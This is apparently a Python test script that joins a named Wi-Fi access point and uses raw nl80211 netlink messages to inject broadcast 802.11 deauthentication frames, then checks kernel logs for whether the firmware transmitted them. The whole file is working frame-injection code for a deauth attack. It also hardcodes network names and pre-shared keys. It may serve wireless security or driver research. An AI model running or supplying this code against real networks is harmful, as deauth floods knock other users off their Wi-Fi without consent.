#!/usr/bin/env python3
"""
Quick test: Connect to target, send deauths with own SA (not spoofed),
check if PE sends them. Using own MAC as SA to test PE TX path directly.
"""
import socket, struct, fcntl, time, subprocess

TARGET_BSSID = "04:67:61:d6:dc:92"
TARGET_BSSID_B = bytes.fromhex(TARGET_BSSID.replace(":",""))
TARGET_FREQ = 2412
IFACE = "wlan0"
HOME_SSID = "9899a5b77"
HOME_PSK = "9006609b29404a"

def run(cmd, timeout=10):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip()

def wpa(cmd):
    return run(f"wpa_cli -i {IFACE} {cmd}")

def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    s.bind((0, 0))
    s.settimeout(3)
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, 5, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return 25

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

fam = get_nl80211_family()
s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
result = fcntl.ioctl(s2, 0x8933, struct.pack('256s', IFACE.encode()))
s2.close()
ifidx = struct.unpack('I', result[16:20])[0]

s3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
info = fcntl.ioctl(s3, 0x8927, struct.pack('256s', IFACE.encode()))
our_mac = info[18:24]
s3.close()

print(f"fam={fam} ifidx={ifidx} mac={our_mac.hex(':')}", flush=True)

# Connect to target
print("\nConnecting to target...", flush=True)
wpa("add_network")
nets = wpa("list_networks")
net_id = "1"
for line in nets.split('\n'):
    parts = line.split('\t')
    if len(parts) >= 1 and parts[0].strip() not in ('network', '0'):
        net_id = parts[0].strip()
        break

wpa(f'set_network {net_id} ssid \'"不想上班"\'')
wpa(f"set_network {net_id} key_mgmt WPA-PSK")
wpa(f'set_network {net_id} psk \'"12345678"\'')
wpa(f"set_network {net_id} bssid {TARGET_BSSID}")
wpa(f"select_network {net_id}")

# Wait for 4WAY state
for i in range(30):
    time.sleep(0.3)
    status = wpa("status")
    if "4WAY" in status:
        print(f"  In 4WAY state at {i*0.3:.1f}s!", flush=True)
        break

# Now send deauths with OWN SA (no spoofing needed)
# This should go through PE because:
# 1. We have a valid session to the AP
# 2. SA matches our MAC (no SA check bypass needed)
print("\nSending deauths with own SA...", flush=True)

s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
s.bind((0, 0))
s.settimeout(1)

ok = fail = 0
errors = {}
seq = 200

for i in range(30):
    # Deauth with OWN SA
    deauth = struct.pack('<HH', 0x00c0, 0)
    deauth += b'\xff\xff\xff\xff\xff\xff'  # DA: broadcast
    deauth += our_mac                       # SA: own (no spoofing!)
    deauth += TARGET_BSSID_B               # BSSID
    deauth += struct.pack('<HH', (seq & 0xfff) << 4, 7)

    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', TARGET_FREQ))
    attrs += nla(51, deauth)
    attrs += struct.pack('HH', 4, 118)  # DONT_WAIT_FOR_ACK
    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fam, 5, seq, 0)

    s.send(nlhdr + payload)
    seq += 1

    try:
        resp = s.recv(4096)
        t = struct.unpack_from('H', resp, 4)[0]
        if t == 2:
            rc = struct.unpack_from('i', resp, 16)[0]
            if rc == 0: ok += 1
            else:
                fail += 1
                errors[rc] = errors.get(rc, 0) + 1
        else: ok += 1
    except:
        fail += 1
        errors[-999] = errors.get(-999, 0) + 1

    time.sleep(0.05)

s.close()
print(f"  OK: {ok}, Fail: {fail}, Errors: {errors}", flush=True)

# Check dmesg for deauth TX
time.sleep(0.5)
dmesg = run("dmesg | grep -iE 'deauth.*tx|tx.*deauth' | tail -10")
print(f"\nDmesg deauth TX:\n{dmesg}", flush=True)

# Reconnect
print("\nReconnecting...", flush=True)
wpa("remove_network all")
wpa("add_network")
wpa(f'set_network 0 ssid \'"{HOME_SSID}"\'')
wpa(f'set_network 0 psk \'"{HOME_PSK}"\'')
wpa("enable_network 0")
wpa("select_network 0")
time.sleep(5)
status = wpa("status")
print(f"Status: {'COMPLETED' if 'COMPLETED' in status else status[:50]}", flush=True)
